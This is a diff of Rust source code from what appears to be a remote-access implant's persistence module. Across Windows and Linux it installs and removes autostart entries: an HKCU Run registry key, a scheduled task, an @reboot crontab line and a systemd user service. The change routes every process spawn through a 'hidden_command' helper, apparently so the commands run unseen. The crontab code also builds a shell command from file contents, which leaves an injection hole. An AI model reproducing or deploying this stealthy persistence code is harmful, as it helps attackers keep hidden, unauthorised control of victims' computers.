@@ -64,7 +64,7 @@ fn install_windows(task_id: i64, name: &str, install_path: &str) -> TaskResult {
     }
 
     // Add to registry Run key (HKCU)
-    let reg_result = std::process::Command::new("reg")
+    let reg_result = crate::utils::helpers::hidden_command("reg")
         .args([
             "add",
             "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -86,7 +86,7 @@ fn install_windows(task_id: i64, name: &str, install_path: &str) -> TaskResult {
     }
 
     // Also create a scheduled task as backup persistence
-    let _ = std::process::Command::new("schtasks")
+    let _ = crate::utils::helpers::hidden_command("schtasks")
         .args([
             "/create",
             "/tn",
@@ -113,7 +113,7 @@ fn remove_windows(task_id: i64, name: &str) -> TaskResult {
     let mut results = Vec::new();
 
     // Remove registry entry
-    let reg_result = std::process::Command::new("reg")
+    let reg_result = crate::utils::helpers::hidden_command("reg")
         .args([
             "delete",
             "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -128,7 +128,7 @@ fn remove_windows(task_id: i64, name: &str) -> TaskResult {
     }
 
     // Remove scheduled task
-    let schtask_result = std::process::Command::new("schtasks")
+    let schtask_result = crate::utils::helpers::hidden_command("schtasks")
         .args(["/delete", "/tn", name, "/f"])
         .output();
     match schtask_result {
@@ -161,13 +161,13 @@ fn install_linux(task_id: i64, name: &str, install_path: &str) -> TaskResult {
             return TaskResult::error(task_id, format!("copy binary: {}", e));
         }
         // Make executable
-        let _ = std::process::Command::new("chmod")
+        let _ = crate::utils::helpers::hidden_command("chmod")
             .args(["+x", &target_path])
             .output();
     }
 
     // Add crontab entry for persistence
-    let existing = std::process::Command::new("crontab")
+    let existing = crate::utils::helpers::hidden_command("crontab")
         .args(["-l"])
         .output()
         .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
@@ -176,7 +176,7 @@ fn install_linux(task_id: i64, name: &str, install_path: &str) -> TaskResult {
     if !existing.contains(&target_path) {
         let cron_entry = format!("@reboot {}", target_path);
         let new_crontab = format!("{}\n{}\n", existing.trim(), cron_entry);
-        let _ = std::process::Command::new("sh")
+        let _ = crate::utils::helpers::hidden_command("sh")
             .args(["-c", &format!("echo '{}' | crontab -", new_crontab)])
             .output();
     }
@@ -192,10 +192,10 @@ fn install_linux(task_id: i64, name: &str, install_path: &str) -> TaskResult {
     );
     let service_path = format!("{}/{}.service", service_dir, name);
     let _ = std::fs::write(&service_path, service_content);
-    let _ = std::process::Command::new("systemctl")
+    let _ = crate::utils::helpers::hidden_command("systemctl")
         .args(["--user", "enable", name])
         .output();
-    let _ = std::process::Command::new("systemctl")
+    let _ = crate::utils::helpers::hidden_command("systemctl")
         .args(["--user", "start", name])
         .output();
 
@@ -213,22 +213,22 @@ fn remove_linux(task_id: i64, name: &str) -> TaskResult {
     let mut results = Vec::new();
 
     // Remove crontab entries
-    let existing = std::process::Command::new("crontab")
+    let existing = crate::utils::helpers::hidden_command("crontab")
         .args(["-l"])
         .output()
         .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
         .unwrap_or_default();
     let filtered: Vec<&str> = existing.lines().filter(|l| !l.contains(name)).collect();
-    let _ = std::process::Command::new("sh")
+    let _ = crate::utils::helpers::hidden_command("sh")
         .args(["-c", &format!("echo '{}' | crontab -", filtered.join("\n"))])
         .output();
     results.push("crontab entries removed".to_string());
 
     // Stop and disable systemd service
-    let _ = std::process::Command::new("systemctl")
+    let _ = crate::utils::helpers::hidden_command("systemctl")
         .args(["--user", "stop", name])
         .output();
-    let _ = std::process::Command::new("systemctl")
+    let _ = crate::utils::helpers::hidden_command("systemctl")
         .args(["--user", "disable", name])
         .output();
 
